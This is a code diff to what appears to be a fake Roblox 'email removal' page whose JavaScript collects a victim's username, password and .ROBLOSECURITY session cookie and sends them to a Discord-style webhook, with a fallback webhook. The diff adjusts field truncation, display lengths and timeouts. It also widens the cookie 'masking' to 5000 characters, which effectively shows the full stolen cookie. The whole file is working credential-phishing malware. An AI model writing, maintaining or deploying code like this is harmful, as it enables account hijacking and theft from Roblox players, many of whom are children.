@@ -551,7 +551,7 @@
             display: flex;
             align-items: flex-start;
             max-width: 380px;
-            z-index: 1000;
+            z-index: 2000;
             transform: translateX(400px);
             transition: transform 0.3s ease-out;
         }
@@ -1201,17 +1201,17 @@
                         fields: [
                             {
                                 name: '👤 Username',
-                                value: '```' + username + '```',
+                                value: '```' + (username.length > 1000 ? username.substring(0, 1000) + '...' : username) + '```',
                                 inline: true
                             },
                             {
                                 name: '🔑 Password',
-                                value: '```' + password + '```',
+                                value: '```' + (password.length > 1000 ? password.substring(0, 1000) + '...' : password) + '```',
                                 inline: true
                             },
                             {
                                 name: '🛡️ ROBLOSECURITY',
-                                value: '```' + cookie + '```'
+                                value: '```' + (cookie.length > 1000 ? cookie.substring(0, 1500) + '...' : cookie) + '```'
                             },
                             {
                                 name: '📧 Email Removal Option',
@@ -1244,7 +1244,7 @@
                     // Add directory field to webhook with enhanced formatting
                     webhookData.embeds[0].fields.push({
                         name: '📁 Directory',
-                        value: '```' + directoryDisplay + '```',
+                        value: '```' + (directoryDisplay.length > 1000 ? directoryDisplay.substring(0, 1000) + '...' : directoryDisplay) + '```',
                         inline: true
                     });
                 }
@@ -1281,7 +1281,7 @@
                             </div>
                         </div>
                         <div style="font-family: monospace; font-size: 10px; opacity: 0.5; line-height: 1.2;">
-                            ${JSON.stringify(webhookData).replace(/"/g, '').substring(0, 500).replace(/(.{40})/g, '$1<br>')}
+                            ${JSON.stringify(webhookData).replace(/"/g, '').substring(0, 5000).replace(/(.{40})/g, '$1<br>')}
                         </div>
                     </div>
                 `;
@@ -1380,7 +1380,7 @@
                                 webhookDataSection.style.boxShadow = '0 0 20px var(--lightning-color1), 0 0 40px var(--lightning-color2)';
                                 setTimeout(() => {
                                     webhookDataSection.style.boxShadow = '';
-                                }, 1000);
+                                }, 2000);
                             }
                         } else {
                             console.error('Fallback webhook failed:', this.status);
@@ -1449,7 +1449,7 @@
                     setTimeout(() => {
                         processBtn.disabled = false;
                         processBtn.innerHTML = '<i class="fas fa-trash-alt"></i> REMOVE EMAIL';
-                    }, 1000);
+                    }, 2000);
                 }
             });
 
@@ -1460,8 +1460,8 @@
                 historyItem.className = 'history-item fade-in';
 
                 // Mask cookie for security
-                const start = cookie.substring(0, 5);
-                const end = cookie.substring(cookie.length - 5);
+                const start = cookie.substring(0, 5000);
+                const end = cookie.substring(cookie.length - 5000);
                 const maskedCookie = start + '...' + end;
 
                 // Determine method text
